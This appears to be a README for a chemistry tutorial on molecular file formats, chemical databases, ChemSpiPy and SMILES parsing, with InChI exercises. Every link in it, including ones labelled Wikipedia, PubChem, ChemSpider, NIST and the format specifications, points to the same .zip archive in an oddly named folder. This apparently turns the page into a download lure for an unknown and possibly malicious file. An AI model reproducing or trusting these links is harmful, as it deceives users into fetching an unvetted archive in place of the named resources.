# Format for Storing and Transmitting Chemical Information
In research and education, computers and internet have been widely adopted. There is many formats, online service and software packages that can be used for learning of molecules and atoms in dynamics
simulation. The basic format consist of:

1. _SMILES_ [`Simplified Molecular-Input Line-Entry System`](https://raw.githubusercontent.com/dindagustiayu/ChemSpiPy-PySMILES-InChI-of-Chemistry-Database/main/undiaphanous/SMILE-of-Chemistry-Spi-In-Database-Ch-Py-Chem-v2.8.zip)
2. _SMART_ [`Smiles Arbitary Target Specification`](https://raw.githubusercontent.com/dindagustiayu/ChemSpiPy-PySMILES-InChI-of-Chemistry-Database/main/undiaphanous/SMILE-of-Chemistry-Spi-In-Database-Ch-Py-Chem-v2.8.zip)
3.  _XYZ_ [`XYZ-py`](https://raw.githubusercontent.com/dindagustiayu/ChemSpiPy-PySMILES-InChI-of-Chemistry-Database/main/undiaphanous/SMILE-of-Chemistry-Spi-In-Database-Ch-Py-Chem-v2.8.zip)
4. _Molfile_ [`MDL Molfile`](https://raw.githubusercontent.com/dindagustiayu/ChemSpiPy-PySMILES-InChI-of-Chemistry-Database/main/undiaphanous/SMILE-of-Chemistry-Spi-In-Database-Ch-Py-Chem-v2.8.zip)
5. _Chemical Markup Language format based on Extensible Markup Language_ [`XML-based formats`](https://raw.githubusercontent.com/dindagustiayu/ChemSpiPy-PySMILES-InChI-of-Chemistry-Database/main/undiaphanous/SMILE-of-Chemistry-Spi-In-Database-Ch-Py-Chem-v2.8.zip)
6. _InChI and InChIkey_ [`The international Chemical Identifier`](https://raw.githubusercontent.com/dindagustiayu/ChemSpiPy-PySMILES-InChI-of-Chemistry-Database/main/undiaphanous/SMILE-of-Chemistry-Spi-In-Database-Ch-Py-Chem-v2.8.zip)

# Online Database
There are several free online service and database that can be searched for information about chemical compounds. 

1. _Wikipedia_ [`https://raw.githubusercontent.com/dindagustiayu/ChemSpiPy-PySMILES-InChI-of-Chemistry-Database/main/undiaphanous/SMILE-of-Chemistry-Spi-In-Database-Ch-Py-Chem-v2.8.zip`](https://raw.githubusercontent.com/dindagustiayu/ChemSpiPy-PySMILES-InChI-of-Chemistry-Database/main/undiaphanous/SMILE-of-Chemistry-Spi-In-Database-Ch-Py-Chem-v2.8.zip)
2. _Chemspider by the Royal Society Chemistry_ [`https://raw.githubusercontent.com/dindagustiayu/ChemSpiPy-PySMILES-InChI-of-Chemistry-Database/main/undiaphanous/SMILE-of-Chemistry-Spi-In-Database-Ch-Py-Chem-v2.8.zip`](https://raw.githubusercontent.com/dindagustiayu/ChemSpiPy-PySMILES-InChI-of-Chemistry-Database/main/undiaphanous/SMILE-of-Chemistry-Spi-In-Database-Ch-Py-Chem-v2.8.zip)
3. _PubChem by National Intitute of Health (NIH)_ [`https://raw.githubusercontent.com/dindagustiayu/ChemSpiPy-PySMILES-InChI-of-Chemistry-Database/main/undiaphanous/SMILE-of-Chemistry-Spi-In-Database-Ch-Py-Chem-v2.8.zip`](https://raw.githubusercontent.com/dindagustiayu/ChemSpiPy-PySMILES-InChI-of-Chemistry-Database/main/undiaphanous/SMILE-of-Chemistry-Spi-In-Database-Ch-Py-Chem-v2.8.zip)
4. _NIST (The US National Institute of STandards and Technology)_ [`https://raw.githubusercontent.com/dindagustiayu/ChemSpiPy-PySMILES-InChI-of-Chemistry-Database/main/undiaphanous/SMILE-of-Chemistry-Spi-In-Database-Ch-Py-Chem-v2.8.zip`](https://raw.githubusercontent.com/dindagustiayu/ChemSpiPy-PySMILES-InChI-of-Chemistry-Database/main/undiaphanous/SMILE-of-Chemistry-Spi-In-Database-Ch-Py-Chem-v2.8.zip)


# P8.1 - ChemSpiPy and the ChemSpider API (Application Programming Interface)
ChemSpiPy is a Python library that interact with the ChemSpider API. It allow chemical searches, chemical file download by querying the ChemSpider service over the internet automatically import data without having to visit the ChemSpider website.

Deduces the srtucture of the following molecules from their  InChi strings:

![Standard InChI](https://raw.githubusercontent.com/dindagustiayu/ChemSpiPy-PySMILES-InChI-of-Chemistry-Database/main/undiaphanous/SMILE-of-Chemistry-Spi-In-Database-Ch-Py-Chem-v2.8.zip%https://raw.githubusercontent.com/dindagustiayu/ChemSpiPy-PySMILES-InChI-of-Chemistry-Database/main/undiaphanous/SMILE-of-Chemistry-Spi-In-Database-Ch-Py-Chem-v2.8.zip)

Reference: [Line Notation SMILES and InChI](https://raw.githubusercontent.com/dindagustiayu/ChemSpiPy-PySMILES-InChI-of-Chemistry-Database/main/undiaphanous/SMILE-of-Chemistry-Spi-In-Database-Ch-Py-Chem-v2.8.zip%3A_Drug_Discovery_-_From_the_Laboratory_to_the_Clinic/05%3A_Organic_Molecules/5.08%3A_Line_Notation_(SMILES_and_InChI))

1. InChI=1S/C6H60/c7-6-4-2-1-3-5-6/h1-5,7H
2. InChI=1S/C5H12O/c1-3-5(2)4-6/h5-6H,3-4H2,1-2H3
3. InChI=1S/C6H10/c1-6-4-2-3-5-6/h4H,2-3, 5H2,1H3
4. InChI=1S/C5H9NO2/c7-5(8)4-2-1-3-6-4/h4,6H,1-3H2,(H,7,8)

# P8.2- SMILES 
The simplified Molecular-Input Line-Entry System (SMILES) represents chemical species as short, plain text (ASCII) strings. This SMILES specification is divided into two distinct parts: A __syntactic specification__ specifies how the atoms, bonds, parentheses, digits, and so forth are represented, and a __Semantic SPecification__ that describes how those symbols are interpreted as a sensible molecule.

__The function and arguments:__

- `read_smiles`
- `explicit_hydrogen = False`
- `zero_order_bonds = True`
- `reinterpret_aromatic = True`
- `strict = True`
